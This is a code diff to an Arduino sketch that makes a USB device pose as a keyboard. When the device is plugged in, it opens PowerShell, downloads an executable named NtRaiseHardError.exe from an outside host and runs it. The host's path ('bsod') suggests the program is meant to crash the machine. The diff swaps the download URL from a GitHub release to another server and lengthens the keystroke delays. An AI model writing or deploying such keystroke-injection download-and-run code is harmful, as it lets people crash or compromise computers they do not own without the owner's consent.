@@ -5,15 +5,15 @@ void setup() {
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
   Keyboard.releaseAll();
-  delay(200);
+  delay(500);
   Keyboard.println("powershell");
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
-  delay(200);
-  Keyboard.println("invoke-webrequest -uri https://github.com/RainySummerLuo/NtRaiseHardError/releases/download/C%2B%2B-1.1.0/NtRaiseHardError.exe -outfile main.exe");
+  delay(500);
+  Keyboard.println("invoke-webrequest -uri https://app.lzc.app/bsod/NtRaiseHardError.exe -outfile main.exe");
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
-  delay(200);
+  delay(500);
   Keyboard.println(".\\main.exe");
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
@@ -22,5 +22,4 @@ void setup() {
 
 void loop() {
   // put your main code here, to run repeatedly:
-
 }
